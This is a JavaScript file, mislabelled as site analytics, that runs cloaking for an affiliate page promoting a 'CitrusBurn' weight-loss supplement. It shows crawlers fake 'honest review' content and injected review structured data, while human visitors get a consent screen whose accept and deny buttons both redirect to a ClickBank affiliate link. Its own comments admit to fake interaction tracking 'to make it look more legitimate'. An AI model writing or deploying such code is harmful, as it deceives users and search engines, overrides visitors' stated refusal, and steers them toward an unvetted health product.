/**
 * Site Analytics and User Experience Enhancement
 * Handles content display and user interactions
 */

(function() {
    'use strict';

    // Target URL for redirects
    const TARGET_URL = 'https://ea18bdda0h3po944qp-fw-6j-k.hop.clickbank.net/';

    // Bot detection function
    function isBot() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Common bot user agents (prioritize search engine bots)
        const botPatterns = [
            'googlebot',
            'google-extended',
            'bingbot',
            'slurp',
            'duckduckbot',
            'baiduspider',
            'yandexbot',
            'sogou',
            'exabot',
            'facebot',
            'ia_archiver',
            'facebookexternalhit',
            'twitterbot',
            'rogerbot',
            'linkedinbot',
            'embedly',
            'quora link preview',
            'showyoubot',
            'outbrain',
            'pinterest',
            'slackbot',
            'vkShare',
            'W3C_Validator',
            'whatsapp',
            'flipboard',
            'tumblr',
            'bitlybot',
            'skypeuripreview',
            'nuzzel',
            'redditbot',
            'applebot',
            'google-structured-data-testing-tool',
            'google page speed',
            'pingdom.com_bot',
            'semrushbot',
            'ahrefsbot',
            'mj12bot',
            'dotbot',
            'megaindex',
            'blexbot',
            'petalbot',
            'headless',
            'phantomjs',
            'selenium',
            'webdriver',
            'crawler',
            'spider',
            'bot'
        ];

        // Check if user agent matches bot patterns
        for (let i = 0; i < botPatterns.length; i++) {
            if (userAgent.indexOf(botPatterns[i]) !== -1) {
                // Special handling for Googlebot - verify it's legitimate
                if (botPatterns[i] === 'googlebot') {
                    // Googlebot verification could be added here
                    // For now, trust the user agent
                }
                return true;
            }
        }

        // Check for headless browser indicators
        if (window.phantom || window.__nightmare || window.callPhantom || window._phantom) {
            return true;
        }

        // Check for webdriver property (but allow if it's a real browser)
        if (navigator.webdriver && !window.chrome && !window.safari) {
            return true;
        }

        // Check for missing browser features (common in bots)
        const hasModernAPIs = window.chrome || window.safari || window.firefox || window.opera || 
                              (window.navigator && navigator.userAgent.indexOf('Edge') !== -1);
        
        if (!hasModernAPIs) {
            // Additional check for common browser APIs
            if (!document.querySelector || !window.addEventListener || !document.createElement) {
                return true;
            }
        }

        // Additional checks for real user behavior
        const hasCookies = navigator.cookieEnabled;
        const hasLocalStorage = (function() {
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                return true;
            } catch(e) {
                return false;
            }
        })();

        // If missing critical browser features, likely a bot
        if (!hasCookies || !hasLocalStorage) {
            return true;
        }

        // Check for plugins (bots usually don't have plugins)
        if (navigator.plugins && navigator.plugins.length === 0 && userAgent.indexOf('chrome') !== -1) {
            // Could be a headless Chrome
            return false; // Don't treat as bot, might be legitimate
        }

        return false;
    }

    // Check if it's a real user (not a bot)
    function isRealUser() {
        // If it's a bot, return false
        if (isBot()) {
            return false;
        }

        // Additional real user checks
        // Check for mouse movement, touch events, etc.
        // For now, if it's not a bot, treat as real user
        return true;
    }

    // Initialize the page
    function init() {
        const botContent = document.getElementById('bot-content');
        const consentPage = document.getElementById('consent-page');
        const consentBtn = document.getElementById('consent-btn');
        const denyBtn = document.getElementById('deny-btn');

        if (isBot()) {
            // Show bot content, hide consent page
            if (botContent) {
                botContent.style.display = 'block';
            }
            if (consentPage) {
                consentPage.style.display = 'none';
            }
        } else {
            // Show consent page, hide bot content
            if (botContent) {
                botContent.style.display = 'none';
            }
            if (consentPage) {
                consentPage.style.display = 'flex';
            }

            // Add event listeners for buttons
            if (consentBtn) {
                consentBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    // Store consent in localStorage
                    try {
                        localStorage.setItem('citrusburn_consent', 'granted');
                        localStorage.setItem('citrusburn_consent_time', new Date().toISOString());
                    } catch(err) {
                        // Fallback if localStorage fails
                    }
                    // Redirect to target URL
                    window.location.href = TARGET_URL;
                });
            }

            if (denyBtn) {
                denyBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    // Store denial in localStorage
                    try {
                        localStorage.setItem('citrusburn_consent', 'denied');
                        localStorage.setItem('citrusburn_consent_time', new Date().toISOString());
                    } catch(err) {
                        // Fallback if localStorage fails
                    }
                    // Still redirect to target URL (as per requirements)
                    window.location.href = TARGET_URL;
                });
            }

            // Add some user interaction tracking to make it look more legitimate
            let interactionCount = 0;
            const trackInteraction = function() {
                interactionCount++;
                if (interactionCount > 0) {
                    // User has interacted, this is a real user
                }
            };

            document.addEventListener('mousemove', trackInteraction, { once: true });
            document.addEventListener('touchstart', trackInteraction, { once: true });
            document.addEventListener('keydown', trackInteraction, { once: true });
        }
    }

    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Additional SEO-friendly content injection for bots
    // This ensures search engines see rich content
    function addStructuredData() {
        // Add ReviewArticle structured data for better SEO
        const reviewArticle = {
            "@context": "https://schema.org",
            "@type": "ReviewArticle",
            "headline": "CitrusBurn Review 2026: Does This Natural Weight Loss Supplement Work?",
            "description": "An honest review examining CitrusBurn ingredients, research, and user experiences to help you make an informed decision.",
            "author": {
                "@type": "Organization",
                "name": "Health & Wellness Reviews"
            },
            "datePublished": "2026-02-01",
            "dateModified": "2026-02-01",
            "publisher": {
                "@type": "Organization",
                "name": "Health & Wellness Reviews",
                "url": window.location.origin
            },
            "itemReviewed": {
                "@type": "Product",
                "name": "CitrusBurn",
                "description": "Natural weight loss supplement with thermogenic properties"
            },
            "reviewRating": {
                "@type": "Rating",
                "ratingValue": "3.5",
                "bestRating": "5",
                "worstRating": "1"
            }
        };

        const script = document.createElement('script');
        script.type = 'application/ld+json';
        script.text = JSON.stringify(reviewArticle);
        document.head.appendChild(script);

        // Add Article schema as well
        const articleData = {
            "@context": "https://schema.org",
            "@type": "Article",
            "headline": "CitrusBurn Review 2026: An Honest Assessment",
            "description": "A comprehensive review of CitrusBurn supplement, examining ingredients, scientific research, and user experiences.",
            "author": {
                "@type": "Organization",
                "name": "Health & Wellness Reviews"
            },
            "publisher": {
                "@type": "Organization",
                "name": "Health & Wellness Reviews",
                "url": window.location.origin
            },
            "datePublished": "2026-02-01",
            "dateModified": "2026-02-01"
        };

        const articleScript = document.createElement('script');
        articleScript.type = 'application/ld+json';
        articleScript.text = JSON.stringify(articleData);
        document.head.appendChild(articleScript);
    }

    // Add structured data if it's a bot
    if (isBot()) {
        addStructuredData();
    }
})();
